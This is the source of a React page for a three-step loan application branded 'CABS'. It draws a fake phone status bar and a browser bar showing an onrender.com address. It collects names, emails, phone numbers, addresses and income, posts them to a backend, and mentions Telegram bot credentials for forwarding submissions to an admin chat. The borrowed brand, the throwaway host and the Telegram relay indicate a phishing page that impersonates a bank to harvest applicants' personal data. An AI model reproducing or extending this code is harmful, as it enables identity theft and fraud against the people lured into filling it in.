'use client';

import { useMemo, useState } from 'react';

const money = (value: number) => `$${value.toLocaleString('en-US', { maximumFractionDigits: 2 })}`;

const formatCurrencyInput = (value: number) => {
  if (!value) return '';
  return value.toString();
};

export default function HomePage() {
  const [step, setStep] = useState(0);
  const [loanAmount, setLoanAmount] = useState(5000);
  const [loanTerm, setLoanTerm] = useState(13);
  const [purpose, setPurpose] = useState('');
  const [employmentStatus, setEmploymentStatus] = useState('');
  const [monthlyIncome, setMonthlyIncome] = useState('');
  const [firstName, setFirstName] = useState('John');
  const [lastName, setLastName] = useState('Moyo');
  const [email, setEmail] = useState('john@example.com');
  const [phone, setPhone] = useState('+263 78456466');
  const [address, setAddress] = useState('12 Samora Machel Ave');
  const [city, setCity] = useState('Harare');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const monthlyPayment = useMemo(() => {
    const principal = loanAmount;
    const r = 0.05 / 12;
    const n = loanTerm;
    const payment = (principal * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
    return payment;
  }, [loanAmount, loanTerm]);

  const totalRepayment = monthlyPayment * loanTerm;

  const next = () => setStep((current) => Math.min(current + 1, 2));
  const back = () => setStep((current) => Math.max(current - 1, 0));

  const submit = async () => {
    setIsSubmitting(true);

    const payload = {
      loanAmount,
      loanTerm,
      purpose,
      employmentStatus,
      monthlyIncome,
      firstName,
      lastName,
      email,
      phone,
      address,
      city,
      monthlyPayment,
      totalRepayment,
    };

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error('Submission failed');
      }

      alert('Your application has been submitted successfully.');
    } catch (error) {
      console.error(error);
      alert('Submission saved locally only. Add BOT_TOKEN and ADMIN_CHAT_ID to enable Telegram notifications.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className="phone-shell">
      <div className="status-bar">
        <span>11:49</span>
        <span>Sat, Oct 17</span>
        <div className="status-icons">
          <span className="signal">◔</span>
          <span className="wifi">◌</span>
          <span className="battery">▣</span>
        </div>
      </div>

      <div className="browser-bar">
        <span className="lock">◌</span>
        <span className="url">loan-cabs.onrender.com/bs/</span>
        <span className="browser-menu">◢</span>
      </div>

      <div className="screen-body">
        <div className="app-header">
          <button className="back-button" aria-label="Back" onClick={back}>
            ←
          </button>
          <div className="brand-wrap">
            <div className="brand">CABS</div>
          </div>
        </div>

        {step === 0 && (
          <section className="card form-card">
            <h1>Loan Application</h1>
            <p>Tell us about your loan needs</p>

            <label className="field">
              <span>LOAN AMOUNT (USD)</span>
              <input value={formatCurrencyInput(loanAmount)} onChange={(e) => setLoanAmount(Number(e.target.value || 0))} />
            </label>

            <label className="field">
              <span>LOAN PURPOSE</span>
              <select value={purpose} onChange={(e) => setPurpose(e.target.value)}>
                <option value="">Select purpose</option>
                <option value="Home renovation">Home renovation</option>
                <option value="Emergency expenses">Emergency expenses</option>
                <option value="Vehicle purchase">Vehicle purchase</option>
                <option value="Business capital">Business capital</option>
              </select>
            </label>

            <label className="field">
              <span>EMPLOYMENT STATUS</span>
              <select value={employmentStatus} onChange={(e) => setEmploymentStatus(e.target.value)}>
                <option value="">Select status</option>
                <option value="Employed">Employed</option>
                <option value="Self-employed">Self-employed</option>
                <option value="Unemployed">Unemployed</option>
                <option value="Student">Student</option>
              </select>
            </label>

            <label className="field">
              <span>MONTHLY INCOME (USD)</span>
              <input value={monthlyIncome} onChange={(e) => setMonthlyIncome(e.target.value)} placeholder="Enter monthly income" />
            </label>

            <div className="button-row">
              <button className="ghost" type="button">BACK</button>
              <button className="primary" type="button" onClick={next}>
                NEXT <span>→</span>
              </button>
            </div>
          </section>
        )}

        {step === 1 && (
          <section className="card calculator-card">
            <h2>How much would you like to borrow?</h2>
            <p>Drag the sliders to set your loan amount</p>

            <div className="slider-block">
              <div className="amount-display">{money(loanAmount)}</div>
              <div className="sub-label">Loan amount</div>

              <div className="range-wrap">
                <input
                  type="range"
                  min={50}
                  max={5000}
                  step={50}
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(Number(e.target.value))}
                />
              </div>
              <div className="range-numbers">
                <span>$ 50</span>
                <span>$ 5,000</span>
              </div>
            </div>

            <div className="slider-block term-block">
              <div className="term-display">{loanTerm} months</div>
              <div className="sub-label">Loan term</div>

              <div className="range-wrap">
                <input
                  type="range"
                  min={3}
                  max={60}
                  step={1}
                  value={loanTerm}
                  onChange={(e) => setLoanTerm(Number(e.target.value))}
                />
              </div>
              <div className="range-numbers">
                <span>3 months</span>
                <span>60 months</span>
              </div>
            </div>

            <div className="summary-box">
              <div className="summary-row">
                <span>Interest rate</span>
                <strong>5% per annum</strong>
              </div>
              <div className="summary-row">
                <span>Monthly payment</span>
                <strong>{money(monthlyPayment)}</strong>
              </div>
              <div className="summary-row">
                <span>Total repayment</span>
                <strong>{money(totalRepayment)}</strong>
              </div>
            </div>

            <div className="button-row compact-row">
              <button className="ghost" type="button" onClick={back}>BACK</button>
              <button className="primary" type="button" onClick={next}>
                CONTINUE <span>→</span>
              </button>
            </div>
          </section>
        )}

        {step === 2 && (
          <section className="card personal-card">
            <h1>Personal Details</h1>
            <p>Complete your profile</p>

            <div className="double-field">
              <label className="field small">
                <span>FIRST NAME</span>
                <input value={firstName} onChange={(e) => setFirstName(e.target.value)} />
              </label>

              <label className="field small">
                <span>LAST NAME</span>
                <input value={lastName} onChange={(e) => setLastName(e.target.value)} />
              </label>
            </div>

            <label className="field">
              <span>EMAIL ADDRESS</span>
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} />
            </label>

            <label className="field">
              <span>PHONE NUMBER (ZIMBABWE)</span>
              <input value={phone} onChange={(e) => setPhone(e.target.value)} />
            </label>

            <p className="hint">E.g. 78456466 (9-digit) or 0778454666 (10-digit)</p>

            <label className="field">
              <span>RESIDENTIAL ADDRESS</span>
              <input value={address} onChange={(e) => setAddress(e.target.value)} />
            </label>

            <label className="field">
              <span>CITY</span>
              <input value={city} onChange={(e) => setCity(e.target.value)} />
            </label>

            <div className="button-row">
              <button className="ghost" type="button" onClick={back}>BACK</button>
              <button className="primary" type="button" onClick={submit} disabled={isSubmitting}>
                {isSubmitting ? 'SUBMITTING...' : 'NEXT '}<span>→</span>
              </button>
            </div>
          </section>
        )}
      </div>

      <nav className="bottom-nav" aria-label="Main navigation">
        <button aria-label="Home">⌂</button>
        <button aria-label="Saved">▣</button>
        <button aria-label="Search">⌕</button>
        <button aria-label="Inbox">◫</button>
        <button aria-label="More">⋮</button>
      </nav>
    </main>
  );
}
